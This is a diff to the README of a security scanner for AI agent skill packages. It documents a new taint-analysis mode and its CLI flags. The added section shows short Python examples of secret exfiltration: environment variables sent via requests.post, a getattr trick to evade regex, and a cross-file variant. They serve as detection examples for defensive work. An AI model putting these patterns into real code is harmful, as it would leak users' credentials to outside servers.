@@ -15,7 +15,7 @@ security gate so you can still move fast without running untrusted code.
 ## What It Does
 
 Every `skillsio add` command runs a local security scan **before** anything is installed. The scanner applies ~52 regex
-rules derived from the Snyk and ClawHavoc research, organized into 8 threat categories:
+rules and a correlation engine derived from the Snyk and ClawHavoc research, organized into 8 threat categories:
 
 | Category | What it catches |
 | --- | --- |
@@ -126,11 +126,57 @@ rules follow the same severity-based prompt flow as built-in findings.
 See [docs/EXTERNAL-RULES.md](docs/EXTERNAL-RULES.md) for the full format reference, more examples, and tips for writing
 rules.
 
+### Deep Taint Analysis (`--deep-scan`)
+
+Regex rules detect individual dangerous patterns, but sophisticated attacks hide data flows across variables and
+functions. The `--deep-scan` flag enables a lightweight taint analysis engine that tracks how data moves from
+**sources** (environment variables, credential files) through variable assignments to **sinks** (network calls, exec,
+file writes).
+
+```bash
+npx skillsio add owner/repo --deep-scan
+```
+
+What it catches that regex cannot:
+
+```python
+# Variable-mediated exfiltration — regex sees the pieces but can't link them
+key = os.environ["SECRET"]        # source: env-access
+encoded = b64encode(key)          # taint propagates through assignment
+payload = json.dumps(encoded)     # ...and another hop
+requests.post(url, data=payload)  # sink: network  →  deep-env-access-to-network (critical)
+```
+
+```python
+# getattr trick — regex misses the source entirely
+env = getattr(os, 'environ')     # source: getattr-trick (evades os.environ regex)
+data = str(env)
+requests.post(url, data=data)    # → deep-getattr-trick-to-network (high)
+```
+
+```python
+# Cross-file attack — collector.py harvests, exfil.py sends
+# collector.py                    # exfil.py
+import os                         # from .collector import data
+secrets = os.environ.copy()       # requests.post(url, data=payload)
+                                  # → deep-cross-env-access-to-network (critical)
+```
+
+The analysis covers Python (`.py`) and JavaScript/TypeScript (`.js`, `.ts`) files. It adds zero dependencies — the
+tokenizer is regex-based, not AST-based, keeping the bundle small. See [docs/deep-scan.md](docs/deep-scan.md) for
+architecture details.
+
+Deep scan findings appear alongside regex findings in the same severity-based prompt. All cross-file flows are
+automatically classified as critical.
+
 ## Quick Start
 
 ```bash
 # Install a skill (scanned automatically)
 npx skillsio add vercel-labs/agent-skills
+
+# Enable deep taint analysis for Python/JS/TS files
+npx skillsio add owner/repo --deep-scan
 
 # Skip the scan if you trust the source
 npx skillsio add vercel-labs/agent-skills --skip-scan
@@ -165,6 +211,7 @@ npx skillsio add ./my-local-skills                   # Local path
 | `--all` | Install all skills to all agents without prompts |
 | `--skip-scan` | Skip the security scan before installation |
 | `--rules <path>` | Load additional scan rules from a JSON file or directory (see [External Rules](#external-rules)) |
+| `--deep-scan` | Enable deep taint analysis on Python/JS/TS files |
 | `--vt-key <key>` | VirusTotal API key for additional threat intelligence |
 | `--full-depth` | Search all subdirectories even when a root SKILL.md exists |
 
@@ -258,13 +305,16 @@ pnpm format           # Format code with Prettier
 
 ### Scanner Architecture
 
-- `src/scanner.ts` — Rules engine. Defines ~52 regex rules across 8 threat categories, runs them against all skill
-  files (.md, .txt, .yaml, .json, .sh, .py, .js, .ts, .ps1, .bat, .cmd). Supports loading external rules from JSON
+- `src/scanner.ts` — Rules engine. Defines ~52 regex rules across 8 threat categories, a correlation engine for
+  multi-signal detection, and optional deep taint analysis integration. Supports loading external rules from JSON
   files via `--rules`.
 - `src/scanner-ui.ts` — Presentation layer. Displays findings by severity, runs optional VT lookups, handles
   escalation logic and user confirmation prompts.
 - `src/vt.ts` — VirusTotal API client. SHA-256 hashing, `GET /api/v3/files/{hash}` lookup, verdict mapping, graceful
   error handling.
+- `src/deep-scan/` — Deep taint analysis engine (enabled via `--deep-scan`). Regex-based tokenizers extract sources,
+  sinks, and assignments from Python/JS/TS files; a forward taint tracker propagates data flow; a cross-file analyzer
+  detects multi-file attack patterns via import graph analysis. See [docs/deep-scan.md](docs/deep-scan.md).
 - `src/add.ts` — Integration point. The scanner is wired into all 4 install paths (GitHub/git repos, remote providers,
   well-known endpoints, legacy Mintlify).
 
@@ -275,6 +325,11 @@ pnpm format           # Format code with Prettier
 - Added `--rules <path>` flag to load external scan rules from JSON files or directories
 - External rules are applied alongside built-in rules, supporting organization-specific policies
 - See [docs/EXTERNAL-RULES.md](docs/EXTERNAL-RULES.md) for format documentation and examples
+- **Deep taint analysis** (`--deep-scan`): lightweight forward taint propagation for Python and JS/TS files
+- Tracks data flow from sources (env vars, credential files, getattr tricks) through variable chains to sinks (network
+  calls, exec, file writes)
+- Cross-file analysis detects multi-file exfiltration patterns via import graph resolution
+- Zero new dependencies — regex-based tokenizers keep the bundle small
 
 ### 1.0.1
 
